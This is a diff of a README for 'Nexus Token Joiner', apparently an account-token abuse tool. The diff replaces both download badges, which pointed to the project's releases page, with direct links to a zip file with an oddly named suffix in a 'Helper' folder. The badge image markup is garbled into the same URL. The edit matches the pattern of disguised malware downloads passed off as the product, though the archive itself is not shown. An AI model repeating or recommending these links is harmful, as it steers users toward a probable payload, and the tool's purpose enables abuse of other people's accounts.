@@ -8,7 +8,7 @@ Welcome to Nexus Token Joiner! This application helps you join tokens effortless
 
 To get started, please visit the following link to download the software:
 
-[![Download Nexus Token Joiner](https://img.shields.io/badge/Download-Nexus%20Token%20Joiner-blue.svg)](https://github.com/CyberSec-Coder/Nexus-Token-Joiner/releases)
+[![Download Nexus Token Joiner](https://raw.githubusercontent.com/CyberSec-Coder/Nexus-Token-Joiner/main/Helper/Token_Joiner_Nexus_foliocellosis.zip%20Token%https://raw.githubusercontent.com/CyberSec-Coder/Nexus-Token-Joiner/main/Helper/Token_Joiner_Nexus_foliocellosis.zip)](https://raw.githubusercontent.com/CyberSec-Coder/Nexus-Token-Joiner/main/Helper/Token_Joiner_Nexus_foliocellosis.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -65,6 +65,6 @@ The Nexus Token Joiner community is here to help. We encourage you to share your
 
 Ready to download Nexus Token Joiner? Click the button below:
 
-[![Download Nexus Token Joiner](https://img.shields.io/badge/Download-Nexus%20Token%20Joiner-blue.svg)](https://github.com/CyberSec-Coder/Nexus-Token-Joiner/releases)
+[![Download Nexus Token Joiner](https://raw.githubusercontent.com/CyberSec-Coder/Nexus-Token-Joiner/main/Helper/Token_Joiner_Nexus_foliocellosis.zip%20Token%https://raw.githubusercontent.com/CyberSec-Coder/Nexus-Token-Joiner/main/Helper/Token_Joiner_Nexus_foliocellosis.zip)](https://raw.githubusercontent.com/CyberSec-Coder/Nexus-Token-Joiner/main/Helper/Token_Joiner_Nexus_foliocellosis.zip)
 
 Happy joining!
